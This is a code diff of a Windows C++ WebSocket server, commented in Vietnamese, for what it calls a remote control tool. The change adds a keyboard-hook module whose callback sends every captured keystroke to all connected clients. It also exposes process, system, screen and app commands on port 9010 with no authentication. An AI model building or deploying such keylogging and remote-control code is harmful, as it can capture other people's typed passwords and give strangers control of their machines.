@@ -1,6 +1,5 @@
-// main.cpp  – WebSocket Server cho RemoteTool
-// Build với: Boost.Beast, Boost.Asio, nlohmann_json
-// Yêu cầu: link ws2_32.lib, wsock32.lib (nếu dùng MSVC)
+// main.cpp – WebSocket Server tích hợp CommandDispatcher mới
+// Build: Boost.Beast, nlohmann/json, User Modules
 
 #define WIN32_LEAN_AND_MEAN
 #include <windows.h>
@@ -13,9 +12,17 @@
 #include <string>
 #include <thread>
 #include <mutex>
+#include <vector>
+#include <algorithm>
 
 #include <nlohmann/json.hpp>
+
+// --- INCLUDE DISPATCHER VÀ INTERFACE ---
 #include "core/CommandDispatcher.hpp"
+#include "interfaces/IRemoteModule.hpp"
+
+// --- INCLUDE MODULE KEYMANAGER (Vẫn cần biến toàn cục cho Hook) ---
+#include "modules/KeyManager.hpp" 
 
 namespace beast     = boost::beast;
 namespace websocket = beast::websocket;
@@ -23,164 +30,174 @@ namespace net       = boost::asio;
 using tcp           = net::ip::tcp;
 using json          = nlohmann::json;
 
+// ============================================================
+// 1. GLOBALS & HELPERS
+// ============================================================
+
 static std::mutex cout_mtx;
-static CommandDispatcher g_dispatcher;
+KeyManager keyManager; // Biến toàn cục để quản lý Hook
 
-//==================== SESSION ====================//
-// Xử lý 1 phiên WebSocket: đọc JSON -> dispatch -> trả JSON
-static void do_session(tcp::socket s) {
+// --- ADAPTER CHO KEYMANAGER ---
+// Vì KeyManager cần là biến toàn cục (để Hook chạy ổn định), 
+// nhưng Dispatcher lại cần unique_ptr<IRemoteModule>.
+// Ta tạo class này để làm cầu nối.
+class KeyManagerAdapter : public IRemoteModule {
+public:
+    const std::string& get_module_name() const override { 
+        static const std::string name = "KEYBOARD";
+        return name;
+    }
+    
+    json handle_command(const json& request) override {
+        // Chuyển tiếp lệnh vào biến toàn cục keyManager
+        return keyManager.handle_command(request);
+    }
+};
+
+// Khởi tạo Dispatcher (Nó sẽ tự new Process, System, App, Screen trong Constructor)
+CommandDispatcher g_dispatcher; 
+
+// ============================================================
+// 2. SESSION MANAGER (Broadcast Keylog)
+// ============================================================
+class SessionManager {
+public:
+    void join(websocket::stream<tcp::socket>* ws) {
+        std::lock_guard<std::mutex> lock(mutex_);
+        sessions_.push_back(ws);
+    }
+
+    void leave(websocket::stream<tcp::socket>* ws) {
+        std::lock_guard<std::mutex> lock(mutex_);
+        sessions_.erase(std::remove(sessions_.begin(), sessions_.end(), ws), sessions_.end());
+    }
+
+    void broadcast(const std::string& message) {
+        std::lock_guard<std::mutex> lock(mutex_);
+        for (auto* ws : sessions_) {
+            try {
+                ws->text(true);
+                ws->write(net::buffer(message));
+            } catch (...) {} // Bỏ qua lỗi nếu client disconnect đột ngột
+        }
+    }
+
+private:
+    std::vector<websocket::stream<tcp::socket>*> sessions_;
+    std::mutex mutex_;
+};
+
+static SessionManager g_sessionManager;
+
+// ============================================================
+// 3. SESSION LOOP
+// ============================================================
+void do_session(tcp::socket s) {
+    websocket::stream<tcp::socket> ws{std::move(s)};
+    
     try {
+        // Info Client
+        std::string client_ip = ws.next_layer().remote_endpoint().address().to_string();
         {
             std::lock_guard<std::mutex> lk(cout_mtx);
-            std::cout << "[SESSION] START from "
-                      << s.remote_endpoint() << "\n";
+            std::cout << "[SESSION] NEW CONNECTION: " << client_ip << "\n";
         }
 
-        websocket::stream<tcp::socket> ws{std::move(s)};
         ws.accept();
-
-        {
-            std::lock_guard<std::mutex> lk(cout_mtx);
-            std::cout << "[SESSION] WS ACCEPTED\n";
-        }
+        g_sessionManager.join(&ws);
 
         for (;;) {
             beast::flat_buffer buffer;
-            ws.read(buffer);
-
-            std::string req = beast::buffers_to_string(buffer.data());
-            {
-                std::lock_guard<std::mutex> lk(cout_mtx);
-                std::cout << "[SESSION] RECV: " << req << "\n";
-            }
-
-            json reply;
+            ws.read(buffer); // Block chờ lệnh
+            
+            std::string req_str = beast::buffers_to_string(buffer.data());
+            
+            // Parse & Dispatch
+            json request, response;
             try {
-                // Ở đây bạn cần đảm bảo đã register module vào g_dispatcher
-                reply = g_dispatcher.dispatch(json::parse(req));
-            } catch (const json::exception& e) {
-                reply = {
-                    {"status","error"},
-                    {"module","CORE"},
-                    {"message", std::string("JSON error: ") + e.what()}
-                };
+                request = json::parse(req_str);
+
+                // Log
+                {
+                    std::lock_guard<std::mutex> lk(cout_mtx);
+                    std::string mod = request.value("module", "?");
+                    std::string cmd = request.value("command", "?");
+                    std::cout << "[RECV] " << mod << " -> " << cmd << "\n";
+                }
+
+                // GỌI DISPATCHER TẠI ĐÂY
+                response = g_dispatcher.dispatch(request);
+
+            } catch (const std::exception& e) {
+                response = {{"status", "error"}, {"message", e.what()}};
             }
 
             ws.text(true);
-            ws.write(net::buffer(reply.dump()));
-
-            {
-                std::lock_guard<std::mutex> lk(cout_mtx);
-                std::cout << "[SESSION] SEND: " << reply.dump() << "\n";
-            }
+            ws.write(net::buffer(response.dump()));
         }
+
     } catch (const beast::system_error& se) {
-        if (se.code() == websocket::error::closed) {
-            std::lock_guard<std::mutex> lk(cout_mtx);
-            std::cout << "[SESSION] Client closed connection\n";
-        } else {
-            std::lock_guard<std::mutex> lk(cout_mtx);
-            std::cerr << "[SESSION] Beast error: "
-                      << se.code().message() << "\n";
+        if (se.code() != websocket::error::closed) {
+            std::cerr << "[ERROR] Beast: " << se.code().message() << "\n";
         }
     } catch (const std::exception& e) {
-        std::lock_guard<std::mutex> lk(cout_mtx);
-        std::cerr << "[SESSION] ERROR: " << e.what() << "\n";
+        std::cerr << "[ERROR] Session: " << e.what() << "\n";
     }
+
+    g_sessionManager.leave(&ws);
 }
 
-//==================== MAIN ====================//
-
+// ============================================================
+// 4. MAIN
+// ============================================================
 int main() {
-    // Tự flush cout ngay sau mỗi << (tránh log bị “đọng” trong buffer)
+    SetConsoleOutputCP(CP_UTF8);
     std::cout << std::unitbuf;
 
+    std::cout << "=== REMOTE CONTROL SERVER (OOP Dispatcher) ===\n";
+
+    // --- A. ĐĂNG KÝ MODULE ---
+    // Các module Process, System, Screen, App ĐÃ ĐƯỢC đăng ký trong Constructor của CommandDispatcher.
+    
+    // Riêng KEYBOARD cần đăng ký thủ công qua Adapter để kết nối với biến toàn cục
+    g_dispatcher.register_module(std::make_unique<KeyManagerAdapter>());
+
+
+    // --- B. SETUP KEYLOGGER CALLBACK ---
+    // Khi KeyManager bắt phím -> Gọi Broadcast
+    KeyManager::set_callback([&](std::string key_char) {
+        json msg;
+        msg["module"] = "KEYBOARD";
+        msg["command"] = "PRESS";
+        msg["data"] = { {"key", key_char} };
+        
+        // Debug log
+        std::cout << "[KEY] " << key_char << "\n";
+        
+        // Gửi cho tất cả Client
+        g_sessionManager.broadcast(msg.dump());
+    });
+
+
+    // --- C. KHỞI TẠO SERVER ---
     try {
-        SetConsoleOutputCP(CP_UTF8);
-        // Vô hiệu Ctrl+C để tránh accept() bị cancel
-        SetConsoleCtrlHandler(NULL, TRUE);
-
-        std::cout << "[MAIN] START\n";
-        std::cout << "[MAIN] BUILD: " << __DATE__ << " " << __TIME__ << "\n";
-
-        // 1. Đăng ký các module cho g_dispatcher (TÙY BẠN)
-        // Ví dụ:
-        // g_dispatcher.register_module(std::make_unique<ProcessManager>());
-        // g_dispatcher.register_module(std::make_unique<SystemControl>());
-        // ...
-
         const unsigned short port = 9010;
-        auto address = net::ip::make_address("0.0.0.0");   // listen trên mọi IP
-        std::cout << "[MAIN] BIND ADDRESS = " << address.to_string()
-                  << ", PORT = " << port << "\n";
-
+        auto address = net::ip::make_address("0.0.0.0");
         net::io_context ioc{1};
+        tcp::acceptor acceptor{ioc, {address, port}};
 
-        // 2. Tạo acceptor & bind port
-        tcp::acceptor acceptor{ioc};
-        beast::error_code ec;
+        std::cout << "[SERVER] Listening on port " << port << "...\n";
 
-        tcp::endpoint endpoint(address, port);
-        acceptor.open(endpoint.protocol(), ec);
-        if (ec) {
-            std::cerr << "[MAIN] acceptor.open error: " << ec.message() << "\n";
-            std::cout << "Press Enter to exit...\n";
-            std::cin.get();
-            return 1;
-        }
-
-        acceptor.set_option(net::socket_base::reuse_address(true), ec);
-        if (ec) {
-            std::cerr << "[MAIN] set_option error: " << ec.message() << "\n";
-        }
-
-        acceptor.bind(endpoint, ec);
-        if (ec) {
-            std::cerr << "[MAIN] bind error: " << ec.message()
-                      << " (port có thể đang bận)\n";
-            std::cout << "Press Enter to exit...\n";
-            std::cin.get();
-            return 1;
-        }
-
-        acceptor.listen(net::socket_base::max_listen_connections, ec);
-        if (ec) {
-            std::cerr << "[MAIN] listen error: " << ec.message() << "\n";
-            std::cout << "Press Enter to exit...\n";
-            std::cin.get();
-            return 1;
-        }
-
-        std::cout << "[MAIN] ACCEPTOR READY\n";
-        std::cout << "LISTENING ws://" << address.to_string()
-                  << ":" << port << "\n";
-        std::cout << "READY, entering accept loop...\n";
-
-        // 3. Vòng lặp accept
         for (;;) {
-            try {
-                tcp::socket s{ioc};
-                std::cout << "[ACCEPT] Waiting for connection...\n";
-                acceptor.accept(s, ec);
-                if (ec) {
-                    std::cerr << "[ACCEPT] error: " << ec.message() << "\n";
-                    continue;
-                }
-
-                std::cout << "[ACCEPT] From "
-                          << s.remote_endpoint() << "\n";
-
-                // Mỗi client 1 thread
-                std::thread(do_session, std::move(s)).detach();
-            }
-            catch (const std::exception& e) {
-                std::cerr << "[ACCEPT LOOP ERROR] " << e.what() << "\n";
-            }
+            tcp::socket socket{ioc};
+            acceptor.accept(socket);
+            std::thread(do_session, std::move(socket)).detach();
         }
+
     } catch (const std::exception& e) {
         std::cerr << "[FATAL] " << e.what() << "\n";
-        std::cout << "Press Enter to exit...\n";
-        std::cin.get();      // giữ console lại để đọc log
         return 1;
     }
+
+    return 0;
 }
